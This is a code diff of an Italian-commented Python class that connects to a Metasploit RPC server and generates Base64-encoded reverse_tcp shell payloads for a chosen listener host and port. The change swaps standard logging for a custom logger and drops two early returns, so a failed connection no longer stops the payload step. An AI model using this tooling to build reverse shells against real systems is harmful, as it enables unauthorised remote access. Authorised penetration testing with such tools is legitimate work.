@@ -1,11 +1,10 @@
 import base64 as b64
-import logging
+from utils import CustomLogger
 from pymetasploit3.msfrpc import MsfRpcClient
 
-logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
 class PayloadHandler:
-    def __init__(self, password: str, host: str = '127.0.0.1', port: int = 55553):
+    def __init__(self, logger: CustomLogger, password: str, host: str = '127.0.0.1', port: int = 55553):
         """
         Inizializza il PayloadHandler con i parametri di connessione a Metasploit.
 
@@ -13,6 +12,7 @@ class PayloadHandler:
         :param host: L'indirizzo IP del server Metasploit.
         :param port: La porta per la connessione RPC di Metasploit.
         """
+        self.logging = logger
         self.password = password
         self.host = host
         self.port = port
@@ -26,11 +26,10 @@ class PayloadHandler:
         """
         try:
             self.client = MsfRpcClient(self.password, host=self.host, port=self.port)
-            logging.info(f"Connessione a Metasploit sulla porta {self.port} con la password fornita.")
+            self.logging.info(f"Connessione a Metasploit sulla porta {self.port} con la password fornita.")
             return self.client
         except Exception as e:
-            logging.error(f"Errore durante la connessione a Metasploit: {e}")
-            return None
+            self.logging.error(f"Errore durante la connessione a Metasploit: {e}")
 
     def generate_payload(self, lhost: str, lport: int) -> str:
         """
@@ -48,8 +47,8 @@ class PayloadHandler:
 
         try:
             if self.client is None:
-                logging.error("Client non connesso. Usa connect() prima di generare il payload.")
-                return None
+                self.logging.error("Client non connesso. Usa connect() prima di generare il payload.")
+
 
             # Carica il modulo del payload e configura le opzioni
             payload = self.client.modules.use(module_type, reverse_tcp)
@@ -62,14 +61,15 @@ class PayloadHandler:
             generated_payload = payload.payload_generate()
 
             if isinstance(generated_payload, str):
-                logging.error(f"Errore nella generazione del payload: {generated_payload}")
+                self.logging.error(f"Errore nella generazione del payload: {generated_payload}")
                 return None
+
 
             # Codifica il payload in Base64
             payload_b64 = b64.b64encode(generated_payload).decode('utf-8')
-            logging.info("Payload generato e codificato in Base64.")
+            self.logging.info("Payload generato e codificato in Base64.")
             return payload_b64
 
         except Exception as e:
-            logging.error(f"Errore nella generazione del payload: {e}")
+            self.logging.error(f"Errore nella generazione del payload: {e}")
             return None
